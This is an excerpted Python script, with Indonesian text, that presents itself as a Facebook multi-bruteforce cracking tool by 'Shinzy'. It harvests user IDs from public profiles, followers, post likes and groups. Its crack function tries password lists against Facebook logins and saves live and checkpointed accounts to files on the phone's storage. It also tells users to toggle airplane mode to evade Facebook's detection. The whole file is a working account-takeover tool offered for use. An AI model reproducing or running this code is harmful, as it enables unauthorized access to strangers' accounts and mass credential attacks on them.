...
def banner():
	clear()
	wel='# SCRIPT MULTI BRUTEFORCE FACEBOOK,SCRIPT PERETASAN FACEBOOK BERBASIS MULTI BRUTE, -SCRIPT PUBLISHER BY : SHINZY-'
...
def menu(my_name,my_id):
	...
	banner()
	sg = '# SCRIPT INI HANYA BOLEH DI GUNAKAN OLEH ORANG YANG SUDAH MEMPEROLEH IZIN DARI AUTHOR : SHINZY, KONTAK IZIN AKSES WA:085740559254'
	fx = mark(sg, style=' bold blue')
	sol().print(fx)
	sg = '# 🖥️NAMA PENGGUNA SCRIPT🖥️ '
	...
	io = '''[bold green]║01║ DUMP ID DARI PUBLIK	    
║02║ DUMP ID DARI PUBLIK (MASAL)   
║03║ DUMP ID DARI FOLLOWER		     
║04║ DUMP ID DARI LIKE POSTINGAN	     
║05║ DUMP ID DARI GRUP PUBLIK
║06║ CRACK DARI FILE
║07║ CEK OPSI CEKPOIN
║08║ CEK HASIL CRACK 
...
def result():
	...
	if kz in ['1','01']:
		try:vin = os.listdir('/sdcard/SHIN-DATA/CP')
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/SHIN-DATA/CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
		...
		try:vin = os.listdir('/sdcard/SHIN-DATA/OK')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/SHIN-DATA/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
			...
			gerr2 = '# SELECT RESULTS TO SHOW'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'['+p+'Shinzy'+x+'] Choose : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# OPTION NOT IN THE MENU'
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/SHIN-DATA/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
...
def file():
	...
	my_files = []
	try:
		lis = os.listdir('/sdcard/SHIN-DATA/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	if len(my_files)==0:
		...
		try:geh = lol[geeh]
			...
			exit()
		try:
			hf = open('/sdcard/SHIN-DATA/CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/SHIN-DATA/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
...
def dump_publik():
	...
	sol().print(win2)
	print(x+'['+h+'•'+x+'] KETIK "me" JIKA ANDA INGIN DUMP DARI TEMAN ANDA')
...
def dumpdump(pil):
	try:
		...
		li = '# MASALAH SAMBUNGAN INTERNET,TEKAN ENTER UNTUK LANJUTKAN'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		input('')
...
def dump_massal():
	...
	if pilih in ['1','01']:
		...
		print(x+'['+h+'Shinzy'+x+'] MASUKKAN BATAS ID TOTAL [20]')
		try:
			jum = int(input(x+'['+p+'Shinzy'+x+'] Number Of Id : '))
		except ValueError:
		...
		ses=requests.Session()
		yz = 0
		print(x+'['+h+'Shinzy'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
		for met in range(jum):
			yz+=1
			kl = input(x+'['+h+str(yz)+x+'] Enter The '+str(yz)+'Id : ')
			uid.append(kl)
	sed='# SEDANG MENGUMPULKAN UID, TUNGGU SAMPAI MUNCUL OPSI BERIKUTNYA'
...
def dump_pengikut():
	...
	pil = input(x+'['+p+'Shinzy'+x+'] INPUT TARGET ID : ')
	try:
		...
		print(x+'['+h+'Shinzy'+x+'] TOTAL : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
		lo = mark(li, style='red')
...
def dump_likes():
	...
	win2 = mark(win, style='bold green')
	sol().print(win2)
	pil = input(x+'['+p+'Shinzy'+x+'] INPUT ID POST : ')
	try:
		...
		teks = '# POSTINGAN TIDAK PUBLIK ATAU TOKEN RUSAK'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()
...
# PENGATURAN ID
def setting():
	wl = '# 👇PILIH SALAH SATU OPSI👇'
	sol().print(mark(wl, style='bold green'))
	teks = '║01║ CRACK DARI ID TERTUA\n║02║ CRACK DARI ID TERMUDA\n║03║ CRACK DARI ID RANDOM'
	...
	win = '#  PERINGATAN : MENAMPILKAN OPSI APLIKASI TERKAIT AKAN MEMBUAT RESULT TERKENA "SESI NEW" , SEBAIKNYA JANGAN MENGGUNAKAN OPSI TERSEBUT'
	win2 = mark(win, style='Bold blue')
	sol().print(win2)
	guw = '# TAMPILKAN APLIKASI TERKAIT '
...
def passwrd():
	...
	ler = ' CRACK BERJALAN , ON/OFF MODE PESAWAT 5 DETIK JIKA TIDAK ADA HASIL, SAYA TIDAK BISA MENJAMIN SCRIPT INI BISA MENDAPATKAN HASIL YANG MEMUASKAN, DI KARENAKAN SERVER FACEBOOK MENDETEKSI AKSES LOGIN BERBASIS WEB SERVER PIHAK KE 3, RASIO CP DAN LIVE 70/30 PERSEN SAJA'
	sol().print(nel(ler, style='Bold white'))
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	sys.stdout.write('\r%sShinzy %s🐍%s 🐍 OK:%s 🐍 CP:%s 🐍 %s%s%s   '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='SHIN-ZY CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='SHIN-ZY LIVE'))
					ok+=1
					break
					...
					cetak(nel(statusok1, title='[bold green]SHIN-ZY LIVE[/bold green]'))
					ok+=1
					break
